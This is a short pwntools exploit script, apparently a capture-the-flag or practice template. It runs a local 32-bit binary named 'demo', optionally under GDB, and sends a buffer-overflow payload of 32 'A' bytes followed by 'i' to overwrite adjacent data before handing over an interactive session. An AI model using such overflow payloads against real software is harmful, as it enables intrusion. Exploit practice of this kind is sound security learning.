#!/usr/bin/python3
from pwn import *

context(arch="i386", os="linux")

elf = context.binary = ELF("./demo")


gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)




io = start()



#=========================================
#            Exploit Here                #
#=========================================

buf = b'A'*32 + b'i'

io.sendline(buf)
io.interactive()

